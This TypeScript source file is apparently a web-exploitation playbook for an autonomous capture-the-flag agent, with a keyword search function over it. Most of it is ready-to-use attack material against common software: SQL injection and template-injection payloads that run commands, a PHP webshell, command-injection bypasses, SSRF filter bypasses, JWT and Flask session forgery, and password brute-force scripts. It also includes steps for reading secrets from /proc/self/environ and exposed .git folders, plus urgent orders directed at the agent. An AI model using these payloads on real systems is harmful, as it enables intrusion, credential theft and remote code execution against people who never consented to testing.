export interface WebKnowledgeRecord {
  name: string;
  signals: string[];
  tests: string[];
  verification: string[];
  pitfalls: string[];
}

const RECORDS: readonly WebKnowledgeRecord[] = [
  {
    name: "sql_injection",
    signals: [
      "user-controlled parameter reaches a database-backed response",
      "error or timing difference after a single-variable mutation",
      "numeric or string parameter in GET/POST that affects result count or content",
      "login form with username/password fields",
      "search box, filter, sort, or order-by parameter",
    ],
    tests: [
      "send a single quote and compare error vs baseline",
      "add AND 1=1 (true) vs AND 1=2 (false) and compare response length or content",
      "time-based: add AND SLEEP(3) — measure response time difference",
      "UNION SELECT NULL to determine column count, then SELECT flag FROM flags",
      "error-based: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)))",
    ],
    verification: [
      "a known value in the database appears verbatim in the response",
      "time-based: consistent N-second delay is reproducible under the same input",
      "flag format pattern matches TSec flag: tsec{...}",
    ],
    pitfalls: [
      "a generic 500 error is not proof — confirm it changes with different payloads",
      "do not spray payloads without first establishing a clean baseline",
      "WAF may block simple quotes — try URL-encode, double-encode, or comment bypass",
    ],
  },
  {
    name: "file_upload",
    signals: [
      "file input in form, multipart/form-data POST endpoint",
      "image or document upload feature with path or filename in response",
      "extension or MIME type validation error message",
    ],
    tests: [
      "upload a .php file with Content-Type: image/jpeg — check if execution occurs",
      "try double extension: shell.php.jpg, shell.php%00.jpg",
      "prepend GIF89a magic bytes to PHP webshell content",
      "try .phtml, .php5, .phar, .shtml as extension alternatives",
      "after successful upload, request the returned file URL to confirm execution",
    ],
    verification: [
      "GET to the uploaded file URL returns execution output (e.g., phpinfo or id result)",
      "flag file is read via executed webshell: <?php system('cat /flag'); ?>",
    ],
    pitfalls: [
      "successful upload alone is not code execution — confirm the file is served and parsed",
      "avoid uploading destructive content; use read-only commands only",
    ],
  },
  {
    name: "ssti",
    signals: [
      "template-like rendering of user input — input appears transformed in output",
      "report generation, email template, or export feature with user-controlled fields",
      "framework error messages: Jinja2, Twig, FreeMarker, Velocity, Mako",
      "Python Flask/Django app with form fields that appear in rendered pages",
    ],
    tests: [
      "inject {{7*7}} — if response shows 49, it is Jinja2/Twig evaluation",
      "inject ${7*7} — if shows 49, FreeMarker or JSP/Thymeleaf",
      "inject #{7*7} — Ruby ERB or Spring SpEL",
      "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      "Jinja2 RCE safe: {{''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['os'].popen('cat /flag').read()}} (adjust index)",
      "Twig: {{['id']|map('system')|join}}",
      "FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag')}",
    ],
    verification: [
      "arithmetic expression evaluates to its result (e.g., 49 for 7*7)",
      "command output appears verbatim in response body",
    ],
    pitfalls: [
      "reflection of the literal string is not evaluation — confirm it computes",
      "do not escalate to RCE before confirming which template engine is active",
      "some fields are sanitized — try in all fields: name, title, description, comment",
    ],
  },
  {
    name: "ssrf",
    signals: [
      "server-side URL fetch feature: webhook, import, callback, preview, health-check, proxy",
      "parameter named url, target, link, src, path, remote, fetch, host, address, endpoint",
      "application fetches external resources based on user-supplied URL",
      "error message reveals internal service name or IP address",
    ],
    tests: [
      "step 1: READ JS SOURCE to find EXACT POST field name — run: curl -s http://TARGET/static/app.js | grep -oE \"(url|target|link|src|path|remote|fetch|host|address|endpoint|probe|check)[\\\"':\\s]\" | sort -u",
      "step 2: also grep for fetch/axios/XMLHttpRequest calls in all JS: curl -s http://TARGET/static/main.js | grep -E 'fetch|axios|xhr|http' | head -20",
      "step 3: with confirmed field name, test SSRF: POST {\"<FIELD>\":\"http://127.0.0.1/\"} — compare response to baseline",
      "step 4: bypass IP filters if 127.0.0.1 is blocked: http://0x7f000001/, http://2130706433/, http://127.1/, http://[::1]/, http://localtest.me/",
      "step 5: enumerate internal services on likely hostnames from app source/errors: try ports 5000, 8080, 8000, 3000, 9000",
      "step 6: read internal service endpoints: /healthz, /info, /debug/config, /api/config, /flag, /secret",
      "step 7: if internal response contains a token/key/secret, IMMEDIATELY use it — try these headers on ALL external endpoints: X-Admin-Token, X-Token, Authorization: Bearer <token>, and query ?token=<token>, ?admin_token=<token>",
      "step 8: also try the token against internal service flag endpoints via SSRF: POST {\"<FIELD>\":\"http://internal-svc:5000/flag\"} with header X-Admin-Token",
    ],
    verification: [
      "response body contains content from the internal service, not the original app",
      "a token extracted from internal config grants access to a restricted endpoint",
      "flag is returned from an internal-only API endpoint after authentication with extracted token",
    ],
    pitfalls: [
      "NEVER guess field names — always read JS source first; the exact field name is always there",
      "getting an internal token is NOT the end — must use it against flag endpoints on BOTH external app and internal service",
      "URL acceptance (200 OK) without different content does not prove SSRF — verify response body changed",
      "if HTTP is blocked for private IPs, try: gopher://, dict://, file:// protocols",
      "if field name is truly unknown, use SecLists: python3 -c \"import requests; [print(k, requests.post('http://TARGET/api/import', json={k:'http://127.0.0.1/'}).text[:50]) for k in open('/Users/j1k3r/wordlists/seclists/param-names.txt').read().splitlines()[:200]]\"",
      "after getting admin_token from /debug/config, enumerate flag endpoint: use httpx: echo -e 'http://TARGET/flag\nhttp://TARGET/admin/flag\nhttp://TARGET/secret\nhttp://TARGET/api/flag' | httpx -H 'X-Admin-Token: <TOKEN>' -sc -content-length",
      "CRITICAL: if ANY http response body or SSRF-relayed content contains flag{...} — call finish_task with that flag value immediately. Do NOT continue probing or call finish_task(blocked).",
      "WARNING: if SSRF result is wrapped in an HTML page (title=探测结果 or similar), the actual internal service response is INSIDE the HTML as text in a result-box or pre tag — extract it with Python: import re; html=...; m=re.search(r'<div[^>]*class=.result-box[^>]*>([\\s\\S]*?)</div>', html); print(m.group(1) if m else 'no match') OR look for JSON-like {{ }} patterns inside the HTML body.",
    ],
  },
  {
    name: "jwt",
    signals: [
      "JWT-shaped cookie or Authorization header: three base64url segments separated by dots",
      "claims like role, admin, isAdmin, user, userId influence authorization",
      "auth token appears in localStorage or cookie after login",
    ],
    tests: [
      "decode header and payload (base64url) to read algorithm and claims",
      "try alg:none bypass: change alg to 'none' and remove signature",
      "brute-force HS256 secret: use jwt_tool or hashcat with common wordlist",
      "forge token with changed claims: role='admin', isAdmin=true",
      "check for RS256→HS256 confusion: sign with server's public key as HS256 secret",
    ],
    verification: [
      "forged token grants access to /admin or restricted resource that returns flag",
      "API response changes meaningfully when role claim is elevated",
    ],
    pitfalls: [
      "decoded claims are not proof of forgery — backend may verify signature",
      "never persist live tokens in lessons or artifacts",
    ],
  },
  {
    name: "lfi_path_traversal",
    signals: [
      "file or template path parameter in URL or POST body",
      "filename, path, page, module, include, template parameter",
      "application reads and displays local files based on user input",
      "PHP include(), require(), or Python open() with user-controlled path",
    ],
    tests: [
      "try ../../etc/passwd to confirm traversal works",
      "read /flag, /flag.txt, /challenge/flag.txt, /root/flag",
      "URL-encode: %2e%2e%2f%2e%2e%2fetc/passwd",
      "double-encode: %252e%252e%252f%252e%252e%252fetc/passwd",
      "null byte: ../../../flag%00.jpg (PHP < 5.4)",
    ],
    verification: [
      "response body contains known file content (e.g., root: in /etc/passwd)",
      "flag pattern tsec{...} appears in response",
    ],
    pitfalls: [
      "path normalization may block simple traversal — try different encoding",
      "check both GET params and POST body for path parameters",
    ],
  },
  {
    name: "flask_session_forgery",
    signals: [
      "Python Flask app (Werkzeug server header, Flask error pages, .py extension)",
      "/login returns consistent 500 error or identical response for all inputs",
      "session cookie is a Flask signed token: three dot-separated base64 segments ending in a signature",
      "cookie value starts with a dot or contains eyJ (base64-encoded JSON)",
    ],
    tests: [
      "step 0: if /login returns 500 for ALL inputs — first check for source code leak BEFORE cracking: GET /.git/HEAD, /static/../app.py, /proc/self/environ; if any returns Python source, find SECRET_KEY directly.",
      "step 1: capture a valid session cookie first — use: curl -c /tmp/cookies.txt -b /tmp/cookies.txt -L http://TARGET/login -d 'username=test&password=test'",
      "step 2: crack the cookie with flask-unsign + rockyou: flask-unsign --unsign --cookie '<COOKIE>' --wordlist /Users/j1k3r/wordlists/rockyou.txt --no-literal-eval",
      "step 3: if rockyou fails, try SecLists top passwords: flask-unsign --unsign --cookie '<COOKIE>' --wordlist /Users/j1k3r/wordlists/seclists/100k-passwords.txt --no-literal-eval",
      "step 4: if wordlist fails try 20 most common Flask secrets inline: python3 -c \"import itsdangerous; keys=['secret','dev','change_me','supersecret','flask','mysecret','ctf','hard','password','admin','flask-secret','SECRET_KEY','development','production','yoursecretkey','thisisasecret','s3cr3t','key','mykey','test']; [print(k) for k in keys]\" | xargs -I{} sh -c \"flask-unsign --unsign --cookie '<COOKIE>' --secret '{}' 2>/dev/null && echo FOUND:{}\"",
      "step 5: forge admin session with found key: flask-unsign --sign --secret '<KEY>' --cookie '{\"user\":\"admin\",\"logged_in\":true}'",
      "step 6: try session payload variations: {\"role\":\"admin\"}, {\"is_admin\":true}, {\"username\":\"admin\",\"admin\":true}",
      "step 7: set forged cookie and access /dashboard, /admin, /assets, /reports",
    ],
    verification: [
      "forged session cookie returns 200 on a previously 302-redirecting admin route",
      "admin page content or flag is returned after setting the forged cookie",
    ],
    pitfalls: [
      "if all routes return 500 including /, session forgery still works — the check happens before rendering",
      "BEFORE cracking, try to leak SECRET_KEY from source: GET /static/../app.py, /.git/HEAD, /proc/self/environ",
      "if /login returns 500 on ALL inputs, first check JS source for required field names — 500 often means a missing required field",
      "if /login returns 500 even with correct fields, check for Werkzeug debug mode: error page shows full traceback and sometimes /console",
      "must capture a real session cookie first before cracking — use curl -c to save cookies from login",
      "flask-unsign --unsign needs a REAL signed cookie from the server, not a forged one",
      "try GET /console if Werkzeug debug mode is enabled (debug_mode traceback in errors)",
      "if secret is not in wordlists, check /proc/self/environ or source code leak for SECRET_KEY",
    ],
  },
  {
    name: "prototype_pollution_pydash",
    signals: [
      "pydash library used for object manipulation in Python app",
      "API endpoint accepts a 'path' parameter for nested object access",
      "cookie or header value is checked as a string against 'admin' keyword",
      "application uses pydash.set() or pydash.get() with user-controlled path",
    ],
    tests: [
      "step 1: check if cookie value check is string-based — try octal encoding: \\141\\144\\155\\151\\156 for 'admin'",
      "step 2: read JS or Python source to find which endpoint accepts a 'path' parameter",
      "step 3: look for file-reading endpoints that expose source (/src, /source, /code, /view)",
      "step 4: try path traversal through the path parameter: path=../../../../flag",
      "step 5: try prototype pollution path: path=__proto__.read=../../../../flag",
    ],
    verification: [
      "octal-encoded cookie value returns 200 on /admin route",
      "file read endpoint returns /flag content after path traversal",
    ],
    pitfalls: [
      "pydash path syntax uses dots and brackets — test both: 'a.b' and 'a[0]'",
      "after finding the file-read primitive, the flag location is /flag or /challenge/flag.txt",
    ],
  },
  {
    name: "php_role_escalation",
    signals: [
      "PHP application with role-based access (developer vs admin)",
      "Serverless console, CloudFunc, or function management interface",
      "login allows non-admin email with any password (default-role flaw)",
      "admin-only features are behind a role check in session/cookie",
    ],
    tests: [
      "step 1: login with any email and password — observe session/cookie and all developer-accessible pages",
      "step 2: CRITICAL ORDER — before ANY brute force, try a small set of common admin passwords FIRST (admin, password, test, 123456, admin123, passwd, toor). A single correct hit grants admin access; failing many guesses first can trigger a per-account lockout that blocks the correct password for the whole remaining run. Record each attempt's status, Set-Cookie, and redirect target.",
      "step 3: look for admin password hints in the login page, JS, README, or console text before guessing (some challenges display it or hint 'test')",
      "step 4: use nginx alias traversal to read PHP source files: GET /public/static/../index.php, /public/static/../login.php, /public/static/../admin.php",
      "step 5: once PHP source is read, search for hardcoded admin password: grep -E \"password|passwd|admin|secret\" in the source",
      "step 6: if source not accessible, try reading via LFI: ?page=../login, ?file=../config.php, ?file=../../keys/xxx.key",
      "step 7: JWT-role apps: locate the signing key path (often /keys/ or /secrets/ referenced by kid=...) and test nginx alias/LFI variants; if HS256 secret is unguessable, prefer the password path over key forgery",
      "step 8: brute-force admin password with SecLists ONLY AFTER common passwords failed and no lockout triggers observed: python3 -c \"\npasswords = open('/Users/j1k3r/wordlists/seclists/100k-passwords.txt').read().splitlines()[:500]\nfor p in passwords:\n    r = __import__('requests').post('http://TARGET/login', data={'username':'admin@example.com','password':p}, allow_redirects=False)\n    if r.status_code in (200,302) and 'dashboard' in r.headers.get('Location',''):\n        print('FOUND:',p); break\n\"",
      "step 9: try direct session manipulation: find the session role field in source then modify it",
    ],
    verification: [
      "admin panel or function runtime becomes accessible after finding/cracking admin password",
      "a JWT with role=admin is returned by a successful login — check the token payload for role and expiry",
      "flag or secret appears in admin-only feature output",
    ],
    pitfalls: [
      "per-account lockout: rapid failed guesses can lock the admin account for many minutes — always try the top common passwords FIRST, one at a time, before any wordlist brute",
      "a single 302/200 login response may be the correct password — capture Set-Cookie/token immediately and use it right away, do not continue guessing afterwards",
      "PHP serverless apps often have admin password hardcoded in login.php or config.php — READ THE SOURCE FIRST",
      "nginx alias traversal /public/static/../file.php only works if the nginx alias ends without /",
      "session in PHP is server-side — modifying PHPSESSID cookie value alone won't escalate role",
      "if login source is readable, admin password is always there — do not brute-force before reading source",
    ],
  },
  {
    name: "rce",
    signals: [
      "code editor, eval endpoint, template execution, or dynamic script runner",
      "parameter that accepts mathematical expression or code snippet",
      "application runs user-supplied commands or scripts on the server",
    ],
    tests: [
      "inject: ; id  |id  `id`  $(id)  into any execution-adjacent field",
      "filter bypass: ${IFS} for space, /???/??t for cat, /fla? for flag",
      "command: cat /flag; cat /flag.txt; cat /challenge/flag.txt",
    ],
    verification: [
      "command output (uid=, /etc/passwd, flag content) appears in response",
    ],
    pitfalls: [
      "output may be in a different field than expected — check full response body",
    ],
  },
  {
    name: "source_code_leak",
    signals: [
      "Python Flask or Django app with no readable source path",
      "login endpoint crashes with 500 for all inputs and no session cookie is issued",
      "Werkzeug server in non-debug mode with opaque 500 errors",
      "static file serving at /static/ that may allow path traversal to parent directory",
      "Git repository that may be exposed at /.git/",
    ],
    tests: [
      "step 1: check for .git exposure: GET /.git/HEAD — if returns 'ref: refs/heads/main', git is exposed; then: curl -s http://TARGET/.git/config",
      "step 2: try direct source reads: GET /static/../app.py, /static/../main.py, /static/../config.py, /static/../settings.py",
      "step 3: try /proc paths: GET /proc/self/environ (shows environment variables incl SECRET_KEY), /proc/self/cmdline",
      "step 4: try common Flask source names: GET /app.py, /src/app.py, /application.py, /wsgi.py",
      "step 5: if .git is exposed, use git dump: python3 -c \"import requests; [print(f, requests.get(f'http://TARGET/.git/{f}').text[:200]) for f in ['config','HEAD','COMMIT_EDITMSG','logs/HEAD']]\"",
      "step 6: check for backup files: GET /app.py.bak, /app.py~, /config.py.bak, /login.py.bak",
      "step 7: if SECRET_KEY found in source or environ: immediately forge Flask session with it",
    ],
    verification: [
      "GET response contains Python source code (import flask, from flask, app = Flask)",
      "SECRET_KEY value extracted from source or environment",
      "Forged session cookie with extracted key grants access to protected routes",
    ],
    pitfalls: [
      "A 403 on /.git/ does not mean git is absent — try /.git/HEAD directly",
      "500 on /login does NOT mean the app is broken — it usually means a missing required field or a code bug; read source to understand",
      "/proc/self/environ output is null-separated; decode with python3 -c 'print(open(\"/proc/self/environ\").read().replace(chr(0), chr(10)))'",
      "After finding SECRET_KEY: forge with flask-unsign --sign --secret '<KEY>' --cookie '{\"user_id\":1,\"admin\":true}'",
    ],
  },
  {
    name: "authentication_bypass",
    signals: [
      "login endpoint with username/password",
      "JWT or session-based auth with client-stored role or admin flag",
      "admin panel at /admin, /administrator, /manage accessible after auth bypass",
    ],
    tests: [
      "try default credentials: admin/admin, admin/password, admin/123456, admin/Password123",
      "send isAdmin=true or role=admin in POST body (mass assignment)",
      "add X-Forwarded-For: 127.0.0.1 header to bypass IP-based restriction",
      "add X-Original-URL: /admin to bypass path-based restriction",
      "try accessing /admin directly without session — some misconfigurations allow it",
    ],
    verification: [
      "admin page returns flag or privileged content after bypass",
    ],
    pitfalls: [
      "mass assignment only works if the backend binds all POST fields to the model",
    ],
  },
];

export function searchWebKnowledge(query: string, limit = 5): WebKnowledgeRecord[] {
  const normalized = query.trim().toLowerCase();
  if (!normalized) return [];
  const terms = normalized.split(/\s+/).filter(Boolean);
  return RECORDS
    .map((record) => {
      const haystack = [record.name, ...record.signals, ...record.tests, ...record.verification].join(" ").toLowerCase();
      const score = terms.reduce((total, term) => total + (haystack.includes(term) ? 1 : 0), 0);
      return { record, score };
    })
    .filter((item) => item.score > 0)
    .sort((left, right) => right.score - left.score || left.record.name.localeCompare(right.record.name))
    .slice(0, Math.max(1, Math.min(limit, 8)))
    .map((item) => item.record);
}

export function listWebKnowledge(): readonly WebKnowledgeRecord[] {
  return RECORDS;
}
